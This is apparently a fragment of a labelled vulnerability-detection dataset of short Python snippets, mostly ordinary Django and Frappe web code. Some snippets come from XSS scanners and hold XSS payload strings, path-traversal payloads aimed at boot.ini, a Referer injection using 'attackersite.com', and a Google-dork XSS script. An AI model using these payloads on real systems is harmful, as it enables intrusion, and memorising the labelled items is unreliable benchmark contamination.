".instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')),", "label": 0}, {"snippet_id": 53500, "code": "]=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get", "label": 0}, {"snippet_id": 44518, "code": " len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1}", "label": 0}, {"snippet_id": 18262, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 4778, "code": "'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head>", "label": 0}, {"snippet_id": 11700, "code": " ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs=", "label": 0}, {"snippet_id": 37057, "code": " \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull", "label": 0}, {"snippet_id": 39527, "code": " update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is", "label": 0}, {"snippet_id": 20157, "code": ".start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in", "label": 0}, {"snippet_id": 50687, "code": " self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"", "label": 0}, {"snippet_id": 5471, "code": "'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey", "label": 0}, {"snippet_id": 11658, "code": ".password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+", "label": 0}, {"snippet_id": 3896, "code": "%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers", "label": 0}, {"snippet_id": 6520, "code": " sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory SSO session cache will be used. \"\"\" return self.config.get(self", "label": 0}, {"snippet_id": 43264, "code": " frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t", "label": 0}, {"snippet_id": 24403, "code": " def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir", "label": 0}, {"snippet_id": 34088, "code": " \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts", "label": 0}, {"snippet_id": 19082, "code": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call", "label": 0}, {"snippet_id": 32839, "code": ">' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>' % self.path) def _DoDirListing(self,", "label": 0}, {"snippet_id": 44366, "code": "'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request)", "label": 1}, {"snippet_id": 42392, "code": ".meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t", "label": 0}, {"snippet_id": 32350, "code": "=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')", "label": 0}, {"snippet_id": 19050, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +", "label": 0}, {"snippet_id": 3491, "code": ".insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query", "label": 0}, {"snippet_id": 43683, "code": "(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency", "label": 0}, {"snippet_id": 17362, "code": "'AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity'", "label": 0}, {"snippet_id": 15320, "code": ".BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self", "label": 0}, {"snippet_id": 24283, "code": " from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for", "label": 0}, {"snippet_id": 6147, "code": "'debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if", "label": 0}, {"snippet_id": 9572, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),", "label": 0}, {"snippet_id": 43341, "code": " to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value", "label": 0}, {"snippet_id": 22915, "code": "=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*", "label": 0}, {"snippet_id": 16003, "code": " cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=", "label": 0}, {"snippet_id": 39112, "code": "=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key", "label": 0}, {"snippet_id": 51500, "code": " except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware", "label": 0}, {"snippet_id": 30817, "code": "\tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv is not None and form.getvalue('right') is", "label": 0}, {"snippet_id": 34299, "code": "\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\"", "label": 0}, {"snippet_id": 50937, "code": " django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin", "label": 0}, {"snippet_id": 18923, "code": "'openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns", "label": 0}, {"snippet_id": 53374, "code": ", Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else", "label": 1}, {"snippet_id": 22825, "code": ".views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 38415, "code": "\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True", "label": 0}, {"snippet_id": 9768, "code": "-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid", "label": 0}, {"snippet_id": 25435, "code": "=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields', False) kwargs['required']=False kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self,", "label": 0}, {"snippet_id": 35645, "code": " _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=", "label": 0}, {"snippet_id": 30409, "code": ".getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'", "label": 0}, {"snippet_id": 18005, "code": "'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 49342, "code": " AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue", "label": 0}, {"snippet_id": 433, "code": " parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\"", "label": 0}, {"snippet_id": 53840, "code": "+str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background", "label": 1}, {"snippet_id": 40929, "code": " import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format,", "label": 1}, {"snippet_id": 30013, "code": "\tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert", "label": 0}, {"snippet_id": 44288, "code": "): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace", "label": 0}, {"snippet_id": 9876, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 21325, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 24001, "code": " process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color", "label": 0}, {"snippet_id": 4726, "code": "'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', ", "label": 0}, {"snippet_id": 2674, "code": "://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 9681, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url", "label": 0}, {"snippet_id": 16239, "code": ", django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done')", "label": 0}, {"snippet_id": 36827, "code": ":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children", "label": 0}, {"snippet_id": 35625, "code": "'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe", "label": 0}, {"snippet_id": 16486, "code": ".end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki", "label": 0}, {"snippet_id": 52701, "code": " mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response", "label": 0}, {"snippet_id": 19543, "code": ".verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated", "label": 0}, {"snippet_id": 42423, "code": "\t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values", "label": 0}, {"snippet_id": 33336, "code": ") routes +=prpc_server.get_routes() return routes def get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[", "label": 0}, {"snippet_id": 51293, "code": ", ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins', 'internet_nl_api_username') search_fields=('name',) list_filter", "label": 0}, {"snippet_id": 36485, "code": "', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not", "label": 0}, {"snippet_id": 43528, "code": ".get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self", "label": 0}, {"snippet_id": 36709, "code": " has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger", "label": 0}, {"snippet_id": 22645, "code": "[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name", "label": 0}, {"snippet_id": 24254, "code": " as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils", "label": 0}, {"snippet_id": 5660, "code": " x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt", "label": 0}, {"snippet_id": 25857, "code": "=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget(), ) elif q.type==Question.TYPE_TIME: field=forms", "label": 0}, {"snippet_id": 54445, "code": "\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row", "label": 0}, {"snippet_id": 1761, "code": " is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard", "label": 0}, {"snippet_id": 22562, "code": "'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 52434, "code": ".doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get", "label": 0}, {"snippet_id": 39048, "code": " df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t", "label": 0}, {"snippet_id": 11785, "code": "'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES", "label": 0}, {"snippet_id": 29405, "code": " open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\"", "label": 0}, {"snippet_id": 28096, "code": ": auth.revoke_session_cookie(auth.get_session_cookie()) except auth.AuthError: logs.log_error('Failed to revoke session cookie.') self.response.delete_cookie('session') self.redirect(self.request.get('dest", "label": 0}, {"snippet_id": 33406, "code": "\\d+>', notifications.TaskPublishNotification), webapp2.Route( r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>', TaskCancelSwarmingTask), ] +bulkproc.get_routes() +prpc_server.get_routes", "label": 0}, {"snippet_id": 21128, "code": ".modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/", "label": 0}, {"snippet_id": 32541, "code": ".SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path", "label": 0}, {"snippet_id": 12891, "code": ".migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS", "label": 0}, {"snippet_id": 36829, "code": ".category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(),", "label": 0}, {"snippet_id": 46985, "code": " @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await", "label": 0}, {"snippet_id": 36700, "code": " get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format", "label": 0}, {"snippet_id": 42838, "code": "\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw", "label": 0}, {"snippet_id": 52774, "code": ".cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id", "label": 0}, {"snippet_id": 17907, "code": "\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view", "label": 0}, {"snippet_id": 53579, "code": " reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle", "label": 0}, {"snippet_id": 43334, "code": " \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install:", "label": 0}, {"snippet_id": 47784, "code": " forward_url=request.GET[\"redirect\"] if not request.user.is_authenticated: return HttpResponseForbidden() profile=Profile.objects.get(authuser=request.user) if profile.rights < 2: return HttpResponseForbidden", "label": 0}, {"snippet_id": 27134, "code": "(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s", "label": 1}, {"snippet_id": 39123, "code": " not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self", "label": 0}, {"snippet_id": 44432, "code": "\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection", "label": 0}, {"snippet_id": 8653, "code": "='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib", "label": 0}, {"snippet_id": 10504, "code": ".join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls", "label": 0}, {"snippet_id": 38474, "code": " from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password", "label": 0}, {"snippet_id": 1045, "code": "://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1:", "label": 1}, {"snippet_id": 33672, "code": "('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category", "label": 0}, {"snippet_id": 46912, "code": "=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content,", "label": 0}, {"snippet_id": 49332, "code": " 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder", "label": 0}, {"snippet_id": 33439, "code": " _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: ", "label": 1}, {"snippet_id": 24149, "code": "\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter", "label": 0}, {"snippet_id": 26817, "code": "%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'", "label": 0}, {"snippet_id": 13180, "code": ".views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 53771, "code": " url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request", "label": 1}, {"snippet_id": 20710, "code": "\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout')", "label": 0}, {"snippet_id": 50631, "code": " for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key", "label": 0}, {"snippet_id": 31008, "code": "\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct", "label": 0}, {"snippet_id": 4252, "code": "'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 39232, "code": "\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers", "label": 0}, {"snippet_id": 29141, "code": "\ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[", "label": 0}, {"snippet_id": 39257, "code": "\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype", "label": 0}, {"snippet_id": 9731, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 19071, "code": "/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) 